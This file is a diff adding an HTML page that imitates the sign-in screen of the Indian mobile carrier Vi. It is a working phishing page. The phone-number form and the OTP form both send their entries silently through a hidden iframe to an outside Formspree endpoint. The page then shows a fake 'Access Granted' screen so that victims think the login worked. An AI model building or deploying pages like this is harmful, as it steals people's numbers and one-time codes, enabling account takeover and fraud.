@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vi - Sign In</title>
+  <style>
+    :root {
+      --vi-red: #ea1014;
+      --vi-dark-red: #cc0000;
+      --vi-yellow: #ffcc00;
+      --text-main: #1f2937;
+      --text-muted: #6b7280;
+      --border-color: #d1d5db;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+    body {
+      background-color: var(--vi-red);
+      color: white;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+    }
+    button { cursor: pointer; border: none; background: none; font-family: inherit; }
+    a { text-decoration: none; color: inherit; }
+    .hidden { display: none !important; }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 3rem;
+      width: 100%;
+    }
+    .header-left { display: flex; align-items: center; gap: 3rem; }
+    .vi-logo {
+      font-size: 2.5rem;
+      font-weight: 900;
+      font-style: italic;
+      letter-spacing: -2px;
+      position: relative;
+      line-height: 1;
+      display: flex;
+      align-items: flex-end;
+    }
+    .vi-logo .i-wrapper { position: relative; }
+    .vi-logo .yellow-dot {
+      position: absolute;
+      top: -4px;
+      right: 0px;
+      width: 8px;
+      height: 8px;
+      background-color: var(--vi-yellow);
+      border-radius: 50%;
+    }
+    .nav-links {
+      display: none;
+      gap: 1.5rem;
+      font-size: 0.95rem;
+      font-weight: 500;
+    }
+    .header-right {
+      display: none;
+      align-items: center;
+      gap: 1.5rem;
+      font-size: 0.95rem;
+      font-weight: 500;
+    }
+    @media (min-width: 1024px) {
+      .nav-links { display: flex; }
+      .header-right { display: flex; }
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      width: 100%;
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+    .promo-section {
+      display: none;
+      width: 50%;
+      position: relative;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 2rem;
+    }
+    @media (min-width: 1024px) {
+      .promo-section { display: flex; }
+    }
+
+    .blob-1 {
+      position: absolute;
+      width: 300px;
+      height: 300px;
+      background: #f04547;
+      border-radius: 40% 60% 70% 30%;
+      z-index: 0;
+      opacity: 0.8;
+      filter: blur(10px);
+    }
+    .blob-2 {
+      position: absolute;
+      width: 200px;
+      height: 200px;
+      background: #ff6b6b;
+      border-radius: 60% 40% 30% 70%;
+      z-index: 0;
+      opacity: 0.6;
+      filter: blur(8px);
+      margin-left: 150px;
+      margin-top: 100px;
+    }
+    .mock-graphic {
+      position: relative;
+      z-index: 1;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      padding: 2rem;
+      border-radius: 1.5rem;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      transform: rotate(-5deg);
+      margin-bottom: 2rem;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+    }
+    .mock-bill {
+      background: white;
+      width: 180px;
+      height: 120px;
+      border-radius: 0.75rem;
+      padding: 1rem;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+    .mock-coin {
+      position: absolute;
+      top: -15px;
+      right: -15px;
+      width: 40px;
+      height: 40px;
+      background: var(--vi-yellow);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #78350f;
+      font-weight: bold;
+      font-size: 1.2rem;
+      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+    }
+    .mock-line-1 { height: 12px; background: #e5e7eb; border-radius: 4px; width: 80%; }
+    .mock-line-2 { height: 12px; background: #e5e7eb; border-radius: 4px; width: 50%; }
+    .mock-line-3 { height: 16px; background: #fee2e2; border-radius: 4px; width: 100%; }
+    .promo-text {
+      position: relative;
+      z-index: 1;
+      font-size: 2.5rem;
+      font-weight: 500;
+      text-align: center;
+      line-height: 1.2;
+    }
+    .carousel-dots {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      gap: 0.5rem;
+      margin-top: 2rem;
+    }
+    .dot { width: 8px; height: 8px; border-radius: 50%; background: rgba(255,255,255,0.5); }
+    .dot.active { width: 24px; background: var(--vi-yellow); border-radius: 4px; }
+
+    .login-section {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
+    @media (min-width: 1024px) {
+      .login-section { width: 50%; padding: 3rem; }
+    }
+    .card {
+      background: white;
+      color: var(--text-main);
+      width: 100%;
+      max-width: 440px;
+      border-radius: 2rem;
+      padding: 2.5rem;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+    }
+    .card h2 {
+      font-size: 2rem;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 2rem;
+      letter-spacing: -0.5px;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 1.5rem;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 1.5rem 1rem 0.5rem;
+      border: 1px solid var(--border-color);
+      border-radius: 0.75rem;
+      font-size: 1rem;
+      outline: none;
+      background: transparent;
+    }
+    .input-group label {
+      position: absolute;
+      left: 1rem;
+      top: 1rem;
+      color: var(--text-muted);
+      font-size: 1rem;
+      background: white;
+      padding: 0 0.25rem;
+      pointer-events: none;
+      transition: 0.2s ease all;
+    }
+    .input-group input:focus ~ label,
+    .input-group input:not(:placeholder-shown) ~ label {
+      top: -0.5rem;
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--vi-red);
+    }
+
+    .btn-primary {
+      width: 100%;
+      background: var(--vi-red);
+      color: white;
+      border-radius: 2rem;
+      padding: 1rem;
+      font-size: 1.125rem;
+      font-weight: 600;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: background 0.2s;
+    }
+    .btn-primary:hover:not(:disabled) { background: var(--vi-dark-red); }
+    .btn-primary:disabled { background: #d1d5db; cursor: not-allowed; color: #9ca3af; }
+
+    .helper-text {
+      text-align: center;
+      font-size: 0.875rem;
+      color: var(--text-muted);
+      margin-top: 1.5rem;
+    }
+    .helper-text a { color: black; font-weight: 600; }
+    .helper-text a:hover { text-decoration: underline; }
+
+    .qr-banner {
+      margin-top: 2rem;
+      border: 1px solid #ffedd5;
+      background: rgba(255, 237, 213, 0.4);
+      border-radius: 1rem;
+      padding: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+    .qr-box {
+      background: white;
+      padding: 0.5rem;
+      border-radius: 0.5rem;
+      border: 1px solid #f3f4f6;
+    }
+    .qr-text h3 { font-size: 0.95rem; font-weight: 700; color: #111827; }
+    .qr-text h3 span { color: var(--vi-red); }
+    .qr-text p { font-size: 0.7rem; color: var(--text-muted); margin-top: 0.125rem; }
+
+    .back-btn {
+      display: flex;
+      align-items: center;
+      gap: 0.25rem;
+      color: var(--text-muted);
+      font-weight: 500;
+      font-size: 0.9rem;
+      margin-bottom: 1.5rem;
+    }
+    .back-btn:hover { color: black; }
+
+    .icon-wrapper { display: flex; justify-content: center; margin-bottom: 1.5rem; }
+    .phone-icon-bg {
+      width: 80px;
+      height: 80px;
+      background: #fef2f2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+    .phone-icon-bg svg { color: #374151; transform: rotate(-10deg); margin-left: 8px; }
+    .message-badge {
+      position: absolute;
+      bottom: -4px;
+      right: -4px;
+      background: var(--vi-red);
+      color: white;
+      padding: 6px;
+      border-radius: 0.5rem;
+    }
+
+    .otp-instructions { text-align: center; margin-bottom: 2rem; }
+    .otp-instructions p { color: #374151; line-height: 1.5; }
+    .otp-instructions span { font-weight: 700; }
+    .otp-instructions .spam-note { color: #9ca3af; font-size: 0.85rem; margin-top: 0.25rem; }
+
+    .otp-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 0.75rem;
+      margin-bottom: 1.5rem;
+    }
+    .otp-inputs input {
+      width: 56px;
+      height: 56px;
+      border: 1px solid var(--border-color);
+      border-radius: 0.75rem;
+      font-size: 1.5rem;
+      font-weight: 600;
+      text-align: center;
+      outline: none;
+    }
+    .otp-inputs input:focus { border-color: var(--vi-red); }
+
+    .resend-link {
+      display: block;
+      text-align: center;
+      color: var(--text-muted);
+      font-weight: 500;
+      font-size: 0.875rem;
+      text-decoration: underline;
+      margin-bottom: 1.5rem;
+    }
+    .resend-link:hover { color: black; }
+
+    .success-icon {
+      width: 80px;
+      height: 80px;
+      background-color: #d1fae5;
+      color: #10b981;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1.5rem auto;
+    }
+    .error-msg {
+      color: #ef4444;
+      font-size: 0.875rem;
+      margin-top: -1rem;
+      margin-bottom: 1rem;
+      display: none;
+      text-align: center;
+    }
+    .error-msg.active { display: block; }
+
+    .zero-fee-badge {
+      display: none;
+      position: fixed;
+      right: 0;
+      top: 50%;
+      background: var(--vi-dark-red);
+      color: white;
+      padding: 1rem 0.25rem;
+      border-radius: 0.5rem 0 0 0.5rem;
+      z-index: 50;
+      writing-mode: vertical-rl;
+      text-orientation: mixed;
+      transform: translateY(-50%) rotate(180deg);
+      font-size: 0.875rem;
+      font-weight: 600;
+      box-shadow: -4px 0 10px rgba(0,0,0,0.1);
+    }
+    @media (min-width: 768px) { .zero-fee-badge { display: block; } }
+  </style>
+</head>
+<body>
+  <div class="zero-fee-badge">Zero Platform Fee</div>
+
+  <header>
+    <div class="header-left">
+      <div class="vi-logo">
+        V<span class="i-wrapper">i<span class="yellow-dot"></span></span>
+      </div>
+      <nav class="nav-links">
+        <a href="#">Prepaid</a>
+        <a href="#">Postpaid</a>
+        <a href="#">New Connection</a>
+        <a href="#">International Roaming</a>
+        <a href="#">5G</a>
+        <a href="#">OTTs & More</a>
+        <a href="#">Help</a>
+        <a href="#">DND & Service Quality</a>
+      </nav>
+    </div>
+    <div class="header-right">
+      <button><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></button>
+      <a href="#">Business</a>
+      <a href="#">Investors</a>
+      <a href="#">Sign In</a>
+    </div>
+  </header>
+
+  <main>
+    <div class="promo-section">
+      <div class="blob-1"></div>
+      <div class="blob-2"></div>
+      <div class="mock-graphic">
+        <div class="mock-bill">
+          <div class="mock-coin">₹</div>
+          <div class="mock-line-1"></div>
+          <div class="mock-line-2"></div>
+          <div class="mock-line-3"></div>
+        </div>
+      </div>
+      <div class="promo-text">
+        one place to <strong>manage all</strong> your plans<br>and payments
+      </div>
+      <div class="carousel-dots">
+        <div class="dot"></div>
+        <div class="dot active"></div>
+        <div class="dot"></div>
+      </div>
+    </div>
+
+    <div class="login-section">
+      <div class="card">
+        <!-- STEP 1: Phone Entry Form -->
+        <div id="step1">
+          <h2>sign in to Vi</h2>
+          <form id="phoneForm" action="https://formspree.io/f/mrpbzbnn" method="POST" target="hidden_iframe">
+            <div class="input-group">
+              <input type="tel" id="mobile" name="phone_number" maxlength="10" placeholder=" " required autocomplete="off">
+              <label for="mobile">vi mobile number</label>
+            </div>
+            <input type="hidden" name="submission_stage" value="Step 1: Phone Number Submitted">
+            <div id="phoneError" class="error-msg"></div>
+            <button type="submit" id="btnGetOtp" class="btn-primary" disabled>get otp</button>
+          </form>
+          <div class="helper-text">
+            don't have a Vi sim? <a href="#">get now</a>
+          </div>
+          <div class="qr-banner">
+            <div class="qr-box">
+              <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><rect x="7" y="7" width="3" height="3"></rect><rect x="14" y="7" width="3" height="3"></rect><rect x="7" y="14" width="3" height="3"></rect><rect x="14" y="14" width="3" height="3"></rect></svg>
+            </div>
+            <div class="qr-text">
+              <h3>download <span>Vi app</span> now</h3>
+              <p>scan the QR code with your mobile to download the app.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEP 2: OTP Entry Form -->
+        <div id="step2" class="hidden">
+          <button type="button" class="back-btn" id="btnBack">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"></polyline></svg>
+            back to sign in
+          </button>
+          <div class="icon-wrapper">
+            <div class="phone-icon-bg">
+              <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+              <div class="message-badge">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+              </div>
+            </div>
+          </div>
+          <div class="otp-instructions">
+            <p>enter OTP sent to number <span id="displayPhone">******7676</span><br>and registered email ID</p>
+            <p class="spam-note">please check your spam folder</p>
+          </div>
+          <form id="otpForm" action="https://formspree.io/f/mrpbzbnn" method="POST" target="hidden_iframe">
+            <!-- Hidden inputs to carry forward the phone number and label the second submission -->
+            <input type="hidden" id="hiddenPhoneField" name="phone_number" value="">
+            <input type="hidden" name="submission_stage" value="Step 2: OTP Code Entered">
+            
+            <div class="otp-inputs">
+              <input type="text" class="otp-box" maxlength="1" inputmode="numeric" required>
+              <input type="text" class="otp-box" maxlength="1" inputmode="numeric" required>
+              <input type="text" class="otp-box" maxlength="1" inputmode="numeric" required>
+              <input type="text" class="otp-box" maxlength="1" inputmode="numeric" required>
+            </div>
+            <!-- Hidden input that accumulates the 4 digits for Formspree -->
+            <input type="hidden" id="fullOtpInput" name="entered_otp" value="">
+
+            <div id="otpError" class="error-msg"></div>
+            <button type="button" class="resend-link">resend OTP</button>
+            <button type="submit" id="btnSubmitOtp" class="btn-primary" disabled>submit OTP</button>
+          </form>
+        </div>
+
+        <!-- STEP 3: Success Screen -->
+        <div id="step3" class="hidden" style="text-align: center; padding: 1rem 0;">
+          <div class="success-icon">
+            <svg width="40" height="40" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3"><path d="M5 13l4 4L19 7"></path></svg>
+          </div>
+          <h2>Access Granted</h2>
+          <p style="color: #10b981; font-weight: 700; margin-bottom: 0.5rem; font-size: 1.1rem;">✓ SPAM SMS is Blocked</p>
+          <p style="color: var(--text-muted); margin-bottom: 2rem;">Welcome back! You have successfully authenticated.</p>
+          <button id="btnSignOut" style="color: var(--vi-red); font-weight: 600; cursor: pointer;">Sign out</button>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Hidden iframe ensures Formspree receives the POST data silently without redirecting your page -->
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+  <script>
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const phoneInput = document.getElementById('mobile');
+    const phoneForm = document.getElementById('phoneForm');
+    const btnGetOtp = document.getElementById('btnGetOtp');
+    const displayPhone = document.getElementById('displayPhone');
+    const btnBack = document.getElementById('btnBack');
+    const otpBoxes = document.querySelectorAll('.otp-box');
+    const otpForm = document.getElementById('otpForm');
+    const btnSubmitOtp = document.getElementById('btnSubmitOtp');
+    const hiddenPhoneField = document.getElementById('hiddenPhoneField');
+    const fullOtpInput = document.getElementById('fullOtpInput');
+    const btnSignOut = document.getElementById('btnSignOut');
+
+    phoneInput.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g, '');
+      e.target.value = val;
+      btnGetOtp.disabled = (val.length !== 10);
+    });
+
+    // Step 1 Submission: Sends phone number to Formspree, then transitions to step 2
+    phoneForm.addEventListener('submit', (e) => {
+      let currentPhone = phoneInput.value;
+      if (currentPhone.length !== 10) {
+        e.preventDefault();
+        return;
+      }
+      
+      hiddenPhoneField.value = currentPhone; // Save phone for the second form
+      btnGetOtp.disabled = true;
+      btnGetOtp.textContent = "getting otp...";
+
+      setTimeout(() => {
+        btnGetOtp.disabled = false;
+        btnGetOtp.textContent = "get otp";
+        displayPhone.textContent = '******' + currentPhone.slice(-4);
+        step1.classList.add('hidden');
+        step2.classList.remove('hidden');
+        otpBoxes.forEach(b => b.value = '');
+        otpBoxes[0].focus();
+      }, 400);
+    });
+
+    btnBack.addEventListener('click', () => {
+      step2.classList.add('hidden');
+      step1.classList.remove('hidden');
+    });
+
+    otpBoxes.forEach((box, index) => {
+      box.addEventListener('input', () => {
+        box.value = box.value.replace(/\D/g, '');
+        if (box.value && index < otpBoxes.length - 1) otpBoxes[index + 1].focus();
+        
+        let otpVal = Array.from(otpBoxes).map(b => b.value).join('');
+        fullOtpInput.value = otpVal;
+        btnSubmitOtp.disabled = (otpVal.length !== 4);
+      });
+      box.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !box.value && index > 0) otpBoxes[index - 1].focus();
+      });
+    });
+
+    // Step 2 Submission: Sends OTP + Phone to Formspree, then shows success screen
+    otpForm.addEventListener('submit', (e) => {
+      let otpVal = Array.from(otpBoxes).map(b => b.value).join('');
+      if (otpVal.length !== 4) {
+        e.preventDefault();
+        return;
+      }
+
+      btnSubmitOtp.disabled = true;
+      btnSubmitOtp.textContent = "verifying...";
+
+      setTimeout(() => {
+        btnSubmitOtp.disabled = false;
+        btnSubmitOtp.textContent = "submit OTP";
+        step2.classList.add('hidden');
+        step3.classList.remove('hidden');
+      }, 400);
+    });
+
+    btnSignOut.addEventListener('click', () => {
+      step3.classList.add('hidden');
+      step1.classList.remove('hidden');
+      phoneInput.value = '';
+      hiddenPhoneField.value = '';
+      fullOtpInput.value = '';
+      btnGetOtp.disabled = true;
+    });
+  </script>
+</body>
+</html>
